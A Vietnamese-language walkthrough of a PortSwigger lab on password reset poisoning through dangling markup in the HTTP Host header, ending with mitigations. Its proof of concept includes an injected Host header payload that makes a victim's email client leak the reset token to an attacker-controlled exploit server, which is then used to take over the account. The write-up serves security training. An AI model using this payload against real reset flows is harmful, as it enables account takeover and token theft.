---
title: "[PortSwigger] Lab 6: Password Reset Poisoning via Dangling Markup"
date: 2026-09-14
description: "Khai thác lỗ hổng Password Reset Poisoning kết hợp kỹ thuật Dangling Markup Injection để đánh cắp token đặt lại mật khẩu của người dùng mà không cần nạn nhân click vào link."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 6
showAuthor: false
showTableOfContents: true
---

## Thông tin bài Lab
* **Tên bài Lab**: Password reset poisoning via dangling markup
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Expert
* **Mục tiêu**: Chiếm đoạt token đặt lại mật khẩu của người dùng `carlos` bằng kỹ thuật Dangling Markup Injection thông qua header Host, đăng nhập và truy cập trang cá nhân của họ.

---

## 1. Mô tả bài toán & Trinh sát (Reconnaissance)

Trong bài lab này, khi người dùng yêu cầu đặt lại mật khẩu, ứng dụng vẫn tạo ra email chứa đường dẫn link reset. Tuy nhiên, nạn nhân (mô phỏng bot) sẽ **không bao giờ click vào liên kết** bên trong email.

Do đó, kỹ thuật can thiệp domain thông thường như Lab 1 sẽ thất bại vì nạn nhân không bấm vào liên kết để gửi token đến máy chủ của ta.

---

## 2. Cơ chế phát sinh lỗ hổng

Ứng dụng cho phép đưa các ký tự đặc biệt (dấu nháy đơn, nháy kép, dấu cách) vào header `Host` mà không lọc sạch khi nhúng vào template HTML của email:

```html
<a href="https://YOUR-INPUT/reset-password?token=XYZ">Reset Password</a>
```

Nếu ta đưa vào một đoạn **Dangling Markup** (thẻ HTML chưa đóng dấu ngoặc hoặc dấu nháy kép, ví dụ `<a href='//exploit-server/?`), toàn bộ nội dung HTML phía sau — bao gồm chính token bí mật — sẽ bị "nuốt chửng" và đính kèm thành tham số gửi tới máy chủ kẻ tấn công ngay khi email client của nạn nhân cố gắng render nội dung hình ảnh hoặc liên kết.

---

## 3. Khai thác lỗ hổng (PoC Step-by-Step)

### Bước 1: Chuẩn bị Dangling Markup Payload
Trên Burp Repeater, gửi request reset password cho `carlos` với header `Host` tùy biến chứa payload Dangling Markup:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

username=carlos
```

Khi email được tạo ra, cấu trúc HTML sẽ trở thành:
```html
<a href="https://YOUR-LAB-ID.web-security-academy.net:'<a href="//exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?/reset-password?token=SECRET_TOKEN">Reset Password</a>
```

### Bước 2: Bắt Token từ Access Log
Truy cập **Access Log** trên Exploit Server. Ta sẽ nhận được một request tự động từ email client nạn nhân chứa toàn bộ token:
```text
GET /?/reset-password?token=abcdef1234567890xyz HTTP/1.1
```

### Bước 3: Đặt lại mật khẩu tài khoản `carlos`
Truy cập đường dẫn đặt lại mật khẩu:
```text
https://YOUR-LAB-ID.web-security-academy.net/reset-password?token=abcdef1234567890xyz
```
Đổi mật khẩu mới và đăng nhập thành công vào tài khoản `carlos`. Bài lab Expert đã được hoàn thành xuất sắc!

---

## 4. Biện pháp khắc phục (Mitigation)
* **Xác thực định dạng Host Header nghiêm ngặt**: Chỉ chấp nhận tên miền hợp lệ theo chuẩn RFC (không chứa ký tự HTML như `'`, `"`, `<`, `>`, khoảng trắng hoặc ký tự điều khiển).
* **Mã hóa ngữ cảnh (Context-aware Encoding)**: Encode toàn bộ dữ liệu động trước khi nhúng vào các template email hoặc trang web HTML.
* **Content Security Policy (CSP)** cho Email / Web Client: Hạn chế nguồn nạp tài nguyên và gửi dữ liệu ra bên ngoài.
